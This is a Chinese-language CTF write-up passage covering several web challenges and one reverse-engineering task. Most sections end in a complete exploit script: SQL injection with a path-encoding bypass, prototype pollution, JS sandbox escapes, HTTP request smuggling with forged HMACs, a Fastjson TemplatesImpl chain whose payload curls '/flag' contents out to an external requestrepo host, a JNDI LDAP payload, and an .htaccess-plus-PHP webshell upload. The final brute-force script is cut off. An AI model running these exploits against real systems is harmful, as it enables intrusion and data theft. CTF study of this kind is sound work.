说明可以直接利用双重编码读取flag文件。

### exp.py:

```python
import requests

base = "url"
s = requests.Session()

user_uid = "a73fb09906fd4bc080c032620bdfc00a" #随便注册个号拿到uid
s.post(base + "/login", data={"uid": user_uid}, timeout=10)

r = s.post(base + "/api/profile", json={"uid": "' OR username='admin'-- "}, timeout=10)
r.raise_for_status()
admin_uid = r.json()["uid"]
print("[+] admin uid:", admin_uid)

s.post(base + "/login", data={"uid": admin_uid}, timeout=10)

flag_resp = s.get(base + "/api/admin?action=backup&file=%252fflag", timeout=10)
print("[+] flag:", flag_resp.text.strip())
```



----



## 4.ezpollute

对源码进行审计，发现核心逻辑：

1. `POST /api/config`
- 接收 JSON 并执行 `merge(config, userConfig, res)`。
- 做了关键字黑名单过滤：`shell/env/exports/main/module/request/init/handle/environ/argv0/cmdline`。
- `merge` 仅拦截了 key 为 `__proto__` 的情况。

2. `GET /api/status`
- 创建 `customEnv = Object.create(null)`。
- 遍历 `process.env`，并对 `NODE_OPTIONS` 做一个正则过滤。
- 调用：
  ```js
  spawn('node', ['-e', 'console.log("System Check: Node.js is running.")'], {
      env: customEnv,
      shell: false
  });
  ```
- 返回子进程 stdout/stderr 到 HTTP 响应。

由于 `merge` 只防了 `__proto__`，但没防：

- `constructor`
- `prototype`

因此可以构造：
```json
{
  "constructor": {
    "prototype": {
      "NODE_OPTIONS": "-r /flag"
    }
  }
}
```

这个递归爬到 `Object.prototype` 挂上 `NODE_OPTIONS`，导致所有的对象都继承了它，从而实现原型链污染攻击。

在 `/api/status` 中：
```js
for (let key in process.env) { ... }
```
`for...in` 会遍历可枚举继承属性。被污染后，`process.env[key]` 能读取原型链上的 `NODE_OPTIONS`。

又因为代码正则：

```
/(?:^|\s)--(require|import|loader|openssl|icu|inspect)\b/i
```

仅检测双横线形式，不检测 `-r`，所以 `NODE_OPTIONS = "-r /flag"` 可以绕过这个拦截。

攻击链构造：

1. 向 `/api/config` 提交原型污染 payload，注入： `Object.prototype.NODE_OPTIONS = "-r /flag"`
2. 访问 `/api/status`：
3. `/flag` 不是合法 JS（内容为 flag 文本），会抛 `SyntaxError` ，程序将 `stderr` 返回出来，完成泄露。

### powershell：

```powershell
$url = 'http://3000-7cb1c1c2-91f5-460e-8721-64e0c25710e5.challenge.ctfplus.cn'
$payload = '{"constructor":{"prototype":{"NODE_OPTIONS":"-r /flag"}}}'

Write-Host "发送污染请求..." -ForegroundColor Yellow
curl.exe -s -X POST "$url/api/config" -H "Content-Type: application/json" -d $payload

Write-Host "发送触发请求..." -ForegroundColor Yellow
curl.exe -s "$url/api/status"

Write-Host "`n完成" -ForegroundColor Green
```



----



## 5.醉里挑灯看剑

服务接口及其逻辑：

1. `POST /api/auth/guest`：初始化 Session，获取含有 `sid` 的访客 Token。
2. `POST /api/caps/sync`：同步能力快照（**提权**）。
3. `POST /api/release/challenge`：在 `release` 权限下获取动态 `nonce`。
4. `POST /api/release/execute`：执行 JS 表达式（**沙箱逃**）。
5. `POST /api/release/claim`：提交证明获取 Flag。

提权漏洞点：

- `appendCapabilityRows`在处理数据时，仅以 `rows[0]` 的键作为白名单。如果第一行缺失 `role/lane` 字段，后续所有行的对应字段都会被强制设为 `null`。

- `getEffectiveCapability`在 SQL 查询中使用了 `COALESCE`：

  SQL

  ```
  COALESCE(role, 'maintainer') AS role,
  COALESCE(lane, 'release') AS lane
  ```

  当数据库中的值为 `NULL` 时，系统会自动将其提升为 `maintainer/release` 权限。

制造null提权。

利用 `normalizeSyncRows`中的特性：

1. 通过设置 `keepRole: false` 构造不含权限键的行。
2. 利用 `source` 字段的字典序排序，确保“空键行”排在第一位。

JSON

```
{
  "ops": [
    {"source": "000", "note": "exploit", "keepRole": false, "keepLane": false},
    {"source": "zzz", "note": "marker"}
  ]
}
```



沙箱绕过点：

`executeExpression`直接使用 `new Function` 执行用户输入的字符串，仅通过 `lintExpression`进行了简单的黑名单过滤：

- **拦截**：`constructor`, `process`, `function`, `eval` 等。
- **过滤**：拦截器仅使用 `.includes()` 检查字符串字面量，未处理动态属性访问或字符串拼接。

利用 JavaScript 的特性，通过字符串拼接绕过就可以黑名单检测，并从函数构造器爬取全局环境：

JavaScript

```
(()=>0)['con'+'structor']('return this')()['pro'+'cess']['env']['RUNNER_KEY']
```

初步思路：首先通过逻辑漏洞将权限提升至 `release`，随后利用沙箱逃逸读取服务端环境变量 `RUNNER_KEY`，最后计算签名：
$$
proof = sha1(sid + : + nonce + : + RUNNER_KEY)
$$
攻击链构造：

1. **身份获取**：访问 `/api/auth/guest` 拿到 `token` 和 `sid`。
2. **触发提权**：向 `/api/caps/sync` 发送构造好的 `ops` 负载，使数据库权限字段变为 `NULL`。
3. **获取挑战**：访问 `/api/release/challenge` 获取当前会话的 `nonce`。
4. **读取密钥**：访问 `/api/release/execute` 执行逃逸 Payload，拿到 `RUNNER_KEY`。
5. **本地签名**：根据 `sid`、`nonce`、`RUNNER_KEY` 计算 SHA1 哈希。
6. **提交获得**：向 `/api/release/claim` 提交 `nonce` 和 `proof`。

### exp.py

```
import json, urllib.request, urllib.error, hashlib

BASE='url'

def req(method, path, data=None, token=None):
    url = BASE + path
    headers = {'Content-Type': 'application/json'}
    if token: headers['Authorization'] = f'Bearer {token}'
    body = json.dumps(data).encode() if data is not None else None
    
    r = urllib.request.Request(url, data=body, headers=headers, method=method)
    with urllib.request.urlopen(r, timeout=15) as f:
        return f.status, json.loads(f.read().decode())

_, guest = req('POST', '/api/auth/guest', {})
token, sid = guest['token'], guest['claims']['sid']

req('POST', '/api/caps/sync', {
    'ops': [
        {'source': '000', 'note': 'pwn', 'keepRole': False, 'keepLane': False},
        {'source': 'zzz', 'note': 'pad'}
    ]
}, token)

_, ch = req('POST', '/api/release/challenge', {}, token)
expr = "(()=>0)['con'+'structor']('return this')()['pro'+'cess']['env']['RUNNER_KEY']"
_, ex = req('POST', '/api/release/execute', {'expression': expr, 'input': {}}, token)

proof = hashlib.sha1(f"{sid}:{ch['nonce']}:{ex['result']}".encode()).hexdigest()
_, claim = req('POST', '/api/release/claim', {'nonce': ch['nonce'], 'proof': proof}, token)
print(f"Result: {claim}")
```

## 

----



## 6.AutoPypy

服务关接口及其逻辑：

1. **`POST /upload`**：上传文件。允许用户自定义 `filename`，通过 `os.path.join` 拼接保存路径。
2. **`POST /run`**：执行文件。通过 `subprocess.run` 启动 `launcher.py` 进程，进而调用 `proot` 进入沙箱环境。



任意文件读取漏洞点：

在源码 `server.py` 中：

```
filename = request.form.get('filename') or file.filename
save_path = os.path.join(UPLOAD_FOLDER, filename)
file.save(save_path)
```

通过 Python 官方文档搜索，可以知道`os.path.join(path, *paths)` 的特性是：如果其中一个参数是 绝对路径，则之前的所有路径部分都会被丢弃，并从该绝对路径开始拼接。 因为题目未对 `filename` 进行路径规范化（如检测 `..` 或禁止 `/` 开头），所以我们就可以传入绝对路径来覆盖系统任意文件。

由于 `/run` 接口会调用 `sys.executable`  来启动脚本，而 Python 启动过程中会默认加载 `site` 模块，并尝试搜索并执行名为 `sitecustomize.py` 的文件。 只要覆盖此文件即可实现远程rce。



沙箱漏洞点：

题目试图通过 `launcher.py` 中的 `proot` 逻辑来实现隔离：

```
cmd = ['proot', '-r', './jail_root', ..., 'python3', 'run.py']
```

**缺陷**：沙箱是在 `launcher.py` 运行之后才创建的。而 `launcher.py` 本身是由外层 Python 解释器启动的。 如果我们在 `site-packages` 目录下注入了 `sitecustomize.py`，那么在 `launcher.py` 还没来得及启动沙箱，我们的恶意代码就已经运行了。



初步思路：利用 `os.path.join` 处理绝对路径的特性实现 任意路径写文件。通过覆盖 Python 解释器启动时会自动加载的 `sitecustomize.py` 文件，在 `launcher.py` 启动 `proot` 沙箱之前执行恶意代码，从而绕过沙箱限制读取 Flag。



攻击链：

1. **构造 Payload**：编写一段 Python 代码，尝试在宿主机多个常见路径下寻找并读取 `flag`。
2. **任意读取构造**：调用 `/upload` 接口，将 `filename` 设置为服务器 Python 的 site-packages 路径，上传 Payload。
3. **触发执行**：上传一个空的 `trigger.py`，然后调用 `/run` 接口执行它。
4. **提前执行并回显**：外层 Python 启动 `launcher.py` 时自动触发，读取 Flag 并通过返回出来。



### exp.py

```
import requests

base = 'urrl'

payload = '''import os
print("===HOOK_START===")
targets = ["/flag", "/app/flag", "/proc/1/root/flag"]
for p in targets:
    try:
        if os.path.exists(p):
            with open(p, 'r') as f:
                print(f"{p}: {f.read().strip()}")
    except: pass
'''

target_path = '/usr/local/lib/python3.10/site-packages/sitecustomize.py'
requests.post(
    f'{base}/upload',
    files={'file': ('sitecustomize.py', payload.encode())},
    data={'filename': target_path}
)

requests.post(
    f'{base}/upload',
    files={'file': ('trigger.py', b"print('RUNNING')")},
    data={'filename': 'trigger.py'}
)

r = requests.post(f'{base}/run', json={'filename': 'trigger.py'})
print(r.json().get('output', ''))
```



---



## 7.Polyglot's Paradox

通过不断的扫描发现：

**外网接口**：`/api/info`, `/api/sandbox/execute`（存在WAF)。

**内网接口**：`/internal/admin`, `/internal/secret-fragment`, `/internal/config`。



http走私漏洞点：

由于系统架构采用了“前置代理 + 后端应用”的结构。响应头显示 `X-Parser: content-length-only`，代理服务器依赖 `Content-Length` 来划分请求界限。 然而，后端服务器同时支持 `Transfer-Encoding: chunked` ，且优先级高于 CL。

- **代理视图**：认为整个 Body 都是第一个请求的内容。
- **后端视图**：遇到 `0\r\n\r\n` 时认为第一个请求结束，剩余的 Body 字节被视为第二个独立的 HTTP 请求。

这边就产生了一个代理与后端的解析差异，通过这个差异我们可以绕过 ACL 直接访问到内网。

构造一个包含恶意请求的 Payload，使后端将其解释为对内网 `/internal/admin` 的调用：

```
POST /api/info HTTP/1.1
Host: localhost
Content-Length: 120
Transfer-Encoding: chunked

0

GET /internal/admin HTTP/1.1
Host: localhost
Connection: keep-alive
X-Ignore: 
```



HMAC伪装和逃逸沙箱漏洞点：

由于内网接口 `/internal/config` 和 `/internal/sandbox/execute` 依赖自定义的 HMAC 签名校验，但签名所需的 `Secret` 片段存储在可访问的内网接口 `/internal/secret-fragment` 中，因此可以直接伪装一个通过校验的HMAC。

系统的 `astWaf` 和 `sandboxHardening` 不是硬编码死，而是可以通过内网 API 动态关闭，在关闭防护后，`new Function` 环境下的沙箱的作用就不大了，隔离不了`constructor` 链。

**HMAC 公式**：
$$
Token = HMAC\_SHA256(Secret, Timestamp + ":" + Nonce + ":" + Body)
$$


**逃逸链**： 

```
globalThis.constructor.constructor("return process.mainModule.require('fs').readFileSync('/flag','utf8')")()
```



总流程：

1. **内网探测**：通过走私访问 `/internal/admin` 确认内网的路由。
2. **密钥收集**：走私访问 `/internal/secret-fragment` 拿到所有 Index 对应的字符串，拼接出完整 Secret：`z3_w0nt_A_gri1fr1e0d!!!`。
3. **降级防护**：计算 HMAC，走私调用 `POST /internal/config`，发送 `{"features":{"astWaf":false,"sandboxHardening":false}}`。
4. **执行命令**：走私调用 `POST /internal/sandbox/execute`，带上沙箱逃逸 Payload 和正确的 HMAC Token。
5. **结果回显**：从后端的 JSON 响应中提取 Flag。



### exp.py

```
import socket
import hmac
import hashlib
import time
import uuid
import json

HOST = 'nc1.ctfplus.cn'
PORT = xxx
SECRET = "z3_w0nt_A_gri1fr1e0d!!!"  

def get_hmac_headers(body, secret):
    timestamp = str(int(time.time() * 1000))
    nonce = uuid.uuid4().hex
    message = f"{timestamp}:{nonce}:{body}"
    signature = hmac.new(
        secret.encode(), 
        message.encode(), 
        hashlib.sha256
    ).hexdigest()
    
    return {
        "X-Internal-Token": signature,
        "X-Timestamp": timestamp,
        "X-Nonce": nonce
    }

def create_smuggle_packet(internal_method, internal_path, internal_body="", headers=None):
    internal_req = f"{internal_method} {internal_path} HTTP/1.1\r\n"
    internal_req += "Host: localhost\r\n"
    internal_req += "Content-Type: application/json\r\n"
    internal_req += f"Content-Length: {len(internal_body)}\r\n"
    
    if headers:
        for k, v in headers.items():
            internal_req += f"{k}: {v}\r\n"
    
    internal_req += "\r\n" + internal_body

    chunked_body = f"0\r\n\r\n{internal_req}"
    
    outer_req = "POST /api/info HTTP/1.1\r\n"
    outer_req += f"Host: {HOST}\r\n"
    outer_req += "Transfer-Encoding: chunked\r\n"
    outer_req += f"Content-Length: {len(chunked_body)}\r\n"
    outer_req += "Content-Type: application/x-www-form-urlencoded\r\n"
    outer_req += "\r\n"
    outer_req += chunked_body
    
    return outer_req.encode()

def send_and_receive(packet):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(5)
        s.connect((HOST, PORT))
        s.sendall(packet)
        
        response = b""
        try:
            while True:
                data = s.recv(4096)
                if not data: break
                response += data
        except socket.timeout:
            pass
        return response.decode(errors='ignore')


print("关闭内网防护 (astWaf & sandboxHardening)...")
config_body = json.dumps({"features": {"astWaf": False, "sandboxHardening": False}})
config_headers = get_hmac_headers(config_body, SECRET)
packet1 = create_smuggle_packet("POST", "/internal/config", config_body, config_headers)
res1 = send_and_receive(packet1)
if "200 OK" in res1:
    print("配置更新成功！")

print("\n执行沙箱逃逸读取 Flag...")
escape_code = 'console.log(globalThis.constructor.constructor("return process.mainModule.require(\'fs\').readFileSync(\'/flag\',\'utf8\')")())'
exec_body = json.dumps({"code": escape_code})
exec_headers = get_hmac_headers(exec_body, SECRET)
packet2 = create_smuggle_packet("POST", "/internal/sandbox/execute", exec_body, exec_headers)
res2 = send_and_receive(packet2)


if "XMCTF{" in res2:
```



---



## 8.polaris oa



拿到 `polaris.jar` 后，我用了直接解压和jdx的方式分析源码，并且这个傻逼环境我真没招。

代码看的头花。

login没作用的来了。

打isctf的时候，我根本不懂java反序列化，结果在这边又遇到了，硬着头皮，我吃了下来。

- `BOOT-INF/classes`：题目主逻辑。
- `BOOT-INF/lib` ：这里决定了能用的 Gadget。

通过查看 `lib` 目录下的 jar 包版本：

- `spring-core-5.3.x.jar`
- `fastjson-1.2.x.jar` (未开启 SafeMode)
- `commons-collections-3.2.2.jar` (可能已修复已知链)

为什么看这个，找的链有问题啊，操。



 `com.polaris.filter.SecurityFilter` 中：Filter 使用了 `request.getServletPath()` 进行路径匹配。

**思路**：

1. 已知 `/user/*` 是白名单。
2. 已知 Tomcat 在处理带有分号 (`;`) 的 URL 时会进行截断，而 Spring MVC 在路由映射时会忽略分号及其后的内容。

**结论**：构造 `/user/..;bypass/ajax`。Filter 看到的是 `/user/` (放行)，Spring 看到的是 `/ajax` (执行)。



审计 `com.polaris.service.ServiceManager` 的 `serializeData(String args)` ：

```
public Object serializeData(String args) {
    return JSON.parse(args); 
}
```

`JSON.parse()` 是典型的 Fastjson 入口。如果 `checkAutoType` 没开，我们需要找白名单内的类或者利用特殊的逻辑。

**尝试 CC**：

检查 `lib` 发现是 `3.2.2`。这个版本通过 `checkSerializable` 修复了 `InvokerTransformer`(说实话，打之前谁看这个，好不容易找到的链）。

**尝试ysoserial(这也是一条魔丸链)**：

目标环境的 Spring5.3 过高，而 `ysoserial` 默认生成的 `ObjectFactoryDelegator` 的 `serialVersionUID` 与目标环境不匹配。

**修正**：这意味着需要针对 Spring 5.3 重新编译(**编译了一个小时快两个小时**)。

Fastjson + TemplatesImpl 链：

由于 Fastjson 在处理 `parse` 时会触发 Getter/Setter 调用，通过搜集类路径下符合条件的类找到的。

**条件**：类在白名单内，且 Getter 包含危险操作。

`com.sun.org.apache.xalan.internal.xsltc.traversal.TemplatesImpl` 是 JDK 自带的，且其 `getOutputProperties()` 会触发字节码加载。

通过 `/user/..;bypass/ajax` 确认 200 OK (**救赎感的来了**）。

通过`ls /` 看到 `/f14g`。

![image-20260329205506379](/images/image-20260329205506379.png)

放张图以示心酸。

### java:

```
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class Exploit extends AbstractTranslet {
    public Exploit() {
        try {
            // 先验证命令执行
            String cmd = "curl http://glrq318a.requestrepo.com/$(cat /flag | base64 | tr -d \"\\n\")";
            Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
        } catch (Exception e) {
        }
    }

    @Override
    public void transform(DOM d, SerializationHandler[] s) throws TransletException {
    }

    @Override
    public void transform(DOM d, DTMAxisIterator i, SerializationHandler s) throws TransletException {
    }
}
```



### exp.py

```
import os
import json
import base64
import requests

BASE = ""
SESSION_ID = ""

JAVA_FILE = "Exploit.java"
CLASS_FILE = "Exploit.class"

CANDIDATE_PATHS = [
    "/user/.bypass/ajax",
    "/user/..;bypass/ajax",
    "/user/%2e%2e/ajax",
    "/user/..;/ajax",
    "/user/..;bypass/ajax/",
    "/user/..;bypass/ajax.json",
]

def compile_java():
    print(f"[*] Compiling {JAVA_FILE} ...")
    cmd = (
        'javac '
        '--add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc=ALL-UNNAMED '
        '--add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED '
        '--add-exports java.xml/com.sun.org.apache.xml.internal.dtm=ALL-UNNAMED '
        '--add-exports java.xml/com.sun.org.apache.xml.internal.serializer=ALL-UNNAMED '
        f'{JAVA_FILE}'
    )
    rc = os.system(cmd)
    if rc != 0:
        raise RuntimeError("javac 编译失败")

def load_bytecode():
    if not os.path.exists(CLASS_FILE):
        raise FileNotFoundError(f"{CLASS_FILE} 不存在")
    with open(CLASS_FILE, "rb") as f:
        return base64.b64encode(f.read()).decode()

def templates_flat(bytecode):
    return {
        "@type": "com.sun.org.apache.xalan.internal.xsltc.traversal.TemplatesImpl",
        "_bytecodes": [bytecode],
        "_name": "yuyu",
        "_tfactory": {},
        "_outputProperties": {}
    }

def templates_wrapped(bytecode):
    return {
        "content": {
            "@type": "com.sun.org.apache.xalan.internal.xsltc.traversal.TemplatesImpl",
            "_bytecodes": [bytecode],
            "_name": "yuyu",
            "_tfactory": {},
            "_outputProperties": {}
        }
    }

def jdbc_payload():
    return {
        "@type": "com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName": "ldap://glrq318a.requestrepo.com:1389/Exploit",
        "autoCommit": True
    }

def base_headers(json_mode=True, spoof_local=False):
    h = {
        "User-Agent": "Mozilla/5.0",
        "Accept": "*/*",
        "Cookie": f"JSESSIONID={SESSION_ID}",
    }
    if json_mode:
        h["Content-Type"] = "application/json"
    if spoof_local:
        h.update({
            "X-Forwarded-For": "127.0.0.1",
            "X-Real-IP": "127.0.0.1",
            "Client-IP": "127.0.0.1",
            "X-Originating-IP": "127.0.0.1",
        })
    return h

def do_post_json(url, payload, spoof_local=False):
    r = requests.post(
        url,
        json=payload,
        headers=base_headers(json_mode=True, spoof_local=spoof_local),
        cookies={"JSESSIONID": SESSION_ID},
        timeout=8,
        allow_redirects=False,
    )
    print(f"[*] JSON  {url} -> {r.status_code}")
    print(r.text[:300])
    return r

def do_post_form(url, payload, spoof_local=False):
    r = requests.post(
        url,
        data={"id": json.dumps(payload)},
        headers=base_headers(json_mode=False, spoof_local=spoof_local),
        cookies={"JSESSIONID": SESSION_ID},
        timeout=8,
        allow_redirects=False,
    )
    print(f"[*] FORM  {url} -> {r.status_code}")
    print(r.text[:300])
    return r

def probe_paths():
    print(f"[*] Probing base: {BASE}")
    results = []
    for path in CANDIDATE_PATHS:
        url = BASE + path
        try:
            r = requests.post(
                url,
                json={"x": 1},
                headers=base_headers(json_mode=True, spoof_local=False),
                cookies={"JSESSIONID": SESSION_ID},
                timeout=6,
                allow_redirects=False,
            )
            print(f"[probe] {path:<28} -> {r.status_code} | {r.text[:120].replace(chr(10), ' ')}")
            results.append((path, r.status_code, r.text))
        except Exception as e:
            print(f"[probe] {path:<28} -> ERR | {e}")
    return results

def choose_targets(results):
    path_bypass = None
    path_admin = None

    for path, code, body in results:
        if path == "/user/..;bypass/ajax" and code in (200, 400):
            path_bypass = path
        if path == "/user/%2e%2e/ajax" and ("权限不足" in body or code in (200, 403)):
            path_admin = path

    return path_bypass, path_admin

def exploit_path(url, payloads, spoof_local=False):
    for name, payload in payloads:
        print(f"\n[+] Trying {name} on {url}")
        r = do_post_json(url, payload, spoof_local=spoof_local)

        if r.status_code == 400 or "For input string" in r.text or "Bad Request" in r.text:
            do_post_form(url, payload, spoof_local=spoof_local)

def main():
    compile_java()
    bytecode = load_bytecode()

    payloads = [
        ("templates-flat", templates_flat(bytecode)),
        ("templates-wrapped", templates_wrapped(bytecode)),
        ("jdbc-flat", jdbc_payload()),
    ]

    results = probe_paths()
    path_bypass, path_admin = choose_targets(results)

    print("\n[*] Selected targets:")
    print(f"    bypass path = {path_bypass}")
    print(f"    admin  path = {path_admin}")

    if path_admin:
        print("\n=== admin-like path: try localhost spoof ===")
        exploit_path(BASE + path_admin, payloads, spoof_local=True)

    if path_bypass:
        print("\n=== bypass path: try normal session ===")
        exploit_path(BASE + path_bypass, payloads, spoof_local=False)

    print("\n[*] Check RequestRepo:")
    print("http://glrq318a.requestrepo.com")
    print("[*] 先看有没有 base64 的 id 请求。")
    print("[*] 有的话，把 Exploit.java 里的 id 改成 cat /flag；不行再试 cat /f14g。")

if __name__ == "__main__":
    main()
```



---



## 9.only_real_revenge

打开目标环境网页，页面呈现为一个“星盟登录”框。 常规思路会尝试 SQL 注入（如 `admin' or 1=1#`），但均无果。查看网页源代码，在 HTML 底部发现了一段被注释的隐藏测试账号：



使用 `xmuser` 和密码 `123456` 成功登录，进入后台页面 `dashboard.php`。 后台展示了当前用户状态，并提供了一个包含“头像上传”和“留言板”的表单。然而：

- 表单中所有的 `<input>` 和 `<button>` 都被添加了 `disabled` 属性。
- 即使通过浏览器 F12 删除了 `disabled` 强制提交，后端也没有任何响应。
- 抓包发现用户身份凭证是 JWT，但签名校验严格，无法轻易越权修改 `role` 为 `admin`。

**结论**：这个 `dashboard.php`没有任何真实的逻辑。



```
dirsearch -u http://<target-ip>/ -e php,bak,zip,txt -x 404
```

- `[200] /upload.php` (真实的上传接口，仅 12 字节响应)
- `[301] /uploads` (真实的上传目录)



直接向 `/upload.php` POST 提交带有 `.php` 后缀的文件，后端返回 “非法类型”。 开始对该接口进行黑名单绕过 Fuzz 测试，尝试了以下：

1. 后缀变异：`.phtml`, `.php5`, `.PhP`, `.php `, `.php.` （均失败，提示非法类型）
2. 双写重命名漏洞：试图让后端保存为 `.php`，却被存成了 `.png` （木马无法执行）
3. 配置文件上传：尝试上传 `.htaccess` 文件。

当上传 `.htaccess` 文件时，后端返回 “上传成功”。尝试访问 `http://<target-ip>/uploads/.htaccess`，服务器返回 403。在 Apache 服务器中，返回 403 证明 `.htaccess` 文件成功上传。



既然我们可以控制该目录下的 Apache 配置文件，就可以通过修改解析规则，让普通图片文件当作 PHP 脚本来执行。

构造并上传 `.htaccess` 向 `/upload.php` 发送名为 `.htaccess` 的文件，内容如下：

```
AddType application/x-httpd-php .png
```



上传伪装木马，准备一个包含恶意代码的 PHP 一句话木马，但将其后缀名改为合法的 `.png`：

- 文件名：`shell.png`
- 文件内容：`<?php system("cat /flag*"); echo "====WIN===="; ?>` 向 `/upload.php` 提交该文件，成功绕过白名单检测。



触发执行，获取 Flag 。



### exp.py

```
import requests

url = ""
upload_dir = "/uploads/"

cookies = {
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3NzQ3Njg4Njh9.2H0yp72IUd5NxcsbNP44bV708Of3yxRzads3V1nG86U"
}

print("开始执行 .htaccess 劫持攻击...\n")

htaccess_payload = b"AddType application/x-httpd-php .png"
files_ht = {"file": (".htaccess", htaccess_payload, "image/png")}

try:
    r1 = requests.post(url, cookies=cookies, files=files_ht, timeout=5)
    print(f"    -> 响应: {r1.text.strip()}")
except Exception as e:
    print(f"    [!] 请求错误: {e}")

php_code = b'<?php system("cat /flag*"); echo "====WIN===="; ?>'
files_png = {"file": ("shell.png", php_code, "image/png")}

try:
    r2 = requests.post(url, cookies=cookies, files=files_png, timeout=5)
    print(f"    -> 响应: {r2.text.strip()}")
except Exception as e:
    print(f"    [!] 请求错误: {e}")

try:
    r3 = requests.get(upload_dir + "shell.png", timeout=5)
    print(f"    -> 状态码: {r3.status_code}")
    print("\n结果：")
    print(r3.text)
except Exception as e:
    print(f"    [!] 请求错误: {e}")
```



---



## 10.Not a Node



访问题目首页，功能是允许用户提交 `index.ts` 代码并部署到后端执行。

通过审计前端静态文件 `/assets/deploy.js`，可以明确部署的 API 交互逻辑：

- **接口:** `POST /api/deploy`
- **数据格式:** `{"code": "<TypeScript代码>", "name": "...", "region": "..."}`
- **响应:** 返回的 JSON 中包含 `endpoint` 字段（如 `/fn/xxxx`），代表部署成功后的访问路径。



在尝试执行常规的沙箱逃逸 Payload 时，发现部署接口存在一层静态关键词拦截：

- 包含 `globalThis` -> 返回 403
- 包含 `constructor` -> 返回 403

经过初步探测，发现环境内置了 `__runtime` 对象且未被过滤。对 `__runtime` 进行键值枚举后，发现了以下属性：

- `hash`, `strlen`, `platform`, `perf`, `encoding`, `_debug`, `_secrets`, `_internal`



打印 `__runtime._internal.lib.symbols` 后，发现了两个奇怪的十六进制命名方法：

- `_0x6c697374` （Hex解码为: `list`，用于列目录）
- `_0x72656164` （Hex解码为: `read`，用于读文件）



尝试直接调用 `_0x72656164("/flag")` 时，发现后端报错。推测底层实现对传入的字符串路径进行了拼接或其他处理，导致找不到文件。

由于通过分析，发现底层是 JSC 和 Bun/Node 类的底层绑定，这类 C++ 绑定函数通常支持 `Buffer` 或 `TypedArray` 作为参数传入。我们将路径 `"/flag"` 转换为 `Uint8Array` 字节流，即可完美绕过上层的字符串处理逻辑，读取flag。

`"/flag"` 的 ASCII 对应数组为：`[47, 102, 108, 97, 103]`。

### exp.py

```
import requests
import json
import re

BASE_URL = ""

def exploit():
    ts_code = """
    export default {
        fetch() {
            try {
                const pathBytes = new Uint8Array([47, 102, 108, 97, 103]);
                const flag = __runtime._internal.lib.symbols._0x72656164(pathBytes);
                return new Response(flag);
            } catch (e) {
                return new Response("Error: " + e.message);
            }
        }
    }
    """
    
    print("[*] Deploying payload...")
    deploy_url = f"{BASE_URL}/api/deploy"
    data = {
        "code": ts_code,
        "name": "exp",
        "region": "default"
    }
    
    res = requests.post(deploy_url, json=data)
    if res.status_code != 200:
        print(f"[-] Deploy failed: {res.text}")
        return
        
    endpoint = res.json().get("endpoint")
    if not endpoint:
        print("[-] Endpoint not found in response.")
        return
        
    print(f"successfully! Endpoint: {endpoint}")
    
    trigger_url = f"{BASE_URL}{endpoint}"
    result = requests.get(trigger_url).text
    
    flag_match = re.search(r'XMCTF\{.*?\}', result)
    if flag_match:
        print(f"Flag:\n\n{flag_match.group(0)}\n")
    else:
        print(f"Flag not found.output:\n{result}")

if __name__ == "__main__":
    exploit()
```



---

---

----

# RE

## 1.移动的秘密

用ida进行反编译：

**主要逻辑**：程序接收用户输入，经过两层加密校验（自定义位移校验 + MD5 哈希校验），完全匹配后输出 "right"。

静态分析中发现函数开头存在反调试机制，说实话，我也不是很会调试

程序使用 `scanf("%29s", buffer)` 获取用户输入，并调用 `strlen`。由此确定 Flag 的精确长度为 29 个字符。

在获取输入后，程序遍历这 29 个字符，进行了转换：

```
loc_11A0:
movzx   esi, byte ptr [rbx+rcx]
shr     sil, 1                   
mov     [rdi+rcx], sil
add     rcx, 1
```

转换后的数组会与内存中硬编码的两段数据（ `xmmword_3080` 和 `xmmword_3090`）进行逐字节比对。

提取目标数组，得到长度为 29 的目标字节： `[0x3C, 0x36, 0x31, 0x3A, 0x33, 0x3D, 0x3B, 0x32, 0x36, 0x31, 0x18, 0x36, 0x32, 0x2F, 0x19, 0x2F, 0x38, 0x37, 0x36, 0x30, 0x39, 0x18, 0x39, 0x2F, 0x18, 0x18, 0x19, 0x19, 0x3E]`

由于 `shr sil, 1` 操作会丢弃最低位（LSB）。因此，每一个目标字节 `b`，其对应的原始字符只可能是 `b * 2` 或 `b * 2 + 1` 两种情况。

通过第一关后，程序调用 `sub_1F60`。ida分析其内部结构，可以发现常量 `0x67452301`, `0xefcdab89` 等，可以初步发现一 MD5 算法的 SIMD 的实现。

最终的 MD5 哈希结果会与 `xmmword_3070` 进行比对。 由于 x86 的小端序特性，提取 `0xADD32914868A321CB319007198C0223A` 要按字节逆序后，得到正确的目标 MD5 哈希： `3a22c098710019b31c328a861429d3ad`

思路：

直接逆向 MD5 根据是不可能的，但因为程序的安全性已经被第一管极大地削弱了。 对于 29 位的 Flag，每个位置只有 2 种可能，总搜索空间为 229 位，直接开爆，利用多进程进行 MD5 哈希碰撞就可以反推flag。

### exp.py

```
import hashlib
from itertools import product
import multiprocessing
import time


TARGET_MD5 = bytes.fromhex("3a22c098710019b31c328a861429d3ad")

TARGET_BYTES = [
    0x3C, 0x36, 0x31, 0x3A, 0x33, 0x3D, 0x3B, 0x32, 0x36, 0x31, 0x18, 0x36, 0x32,
    0x2F, 0x19, 0x2F, 0x38, 0x37, 0x36, 0x30, 0x39, 0x18, 0x39, 0x2F, 0x18, 0x18, 0x19, 0x19, 0x3E
]

def check_chunk(prefix):

    suffix_chars = [[b * 2, b * 2 + 1] for b in TARGET_BYTES[len(prefix):]]
    
    for suffix in product(*suffix_chars):
        candidate = bytes(prefix) + bytes(suffix)
        if hashlib.md5(candidate).digest() == TARGET_MD5:
            return candidate
    return None

if __name__ == '__main__':
    start_time = time.time()
    
    possible_chars = [[b * 2, b * 2 + 1] for b in TARGET_BYTES]
    
    prefix_length = 6
    prefixes = list(product(*possible_chars[:prefix_length]))
    
    print(f"开始爆破: 2^29...")
    
    with multiprocessing.Pool() as pool:
